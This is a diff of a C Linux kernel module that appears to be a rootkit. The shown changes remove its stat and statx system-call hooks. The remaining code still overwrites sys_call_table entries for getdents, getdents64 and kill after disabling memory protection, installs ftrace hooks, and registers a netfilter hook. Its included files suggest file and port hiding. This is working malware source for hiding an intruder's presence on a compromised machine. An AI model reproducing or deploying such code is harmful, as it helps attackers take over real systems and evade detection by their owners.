@@ -25,7 +25,6 @@ responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*
 #include "includes/bds_ftrace.h"
 #include "includes/bds_getdents.c"
 #include "includes/bds_kill.c"
-#include "includes/bds_stat.c"
 #include "includes/bds_netfilter.c"
 #include "includes/bds_hide_port.c"
 #include "includes/bds_ftrace_hooks.c"
@@ -43,16 +42,12 @@ static int bds_start(void) {
 	orig_getdents = (t_syscall)sys_call_table[__NR_getdents];
 	orig_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];
 	orig_kill = (t_syscall)sys_call_table[__NR_kill];
-	orig_stat = (t_syscall)sys_call_table[__NR_stat];
-	orig_statx = (t_syscall)sys_call_table[__NR_statx];
         
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	unprotect_memory();
 	sys_call_table[__NR_getdents] = (unsigned long) bds_getdents;
 	sys_call_table[__NR_getdents64] = (unsigned long) bds_getdents64;
 	sys_call_table[__NR_kill] = (unsigned long) bds_kill;
-	sys_call_table[__NR_stat] = (unsigned long) bds_stat;
-	sys_call_table[__NR_statx] = (unsigned long) bds_statx;
 	protect_memory();
 	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 	nfho->hook  = (nf_hookfn*)bds_nf_hook;      
@@ -73,8 +68,6 @@ static void bds_end(void) {
 	sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
-	sys_call_table[__NR_stat] = (unsigned long) orig_stat;
-	sys_call_table[__NR_statx] = (unsigned long) orig_statx;
     
 	protect_memory();
 	nf_unregister_net_hook(&init_net, nfho);
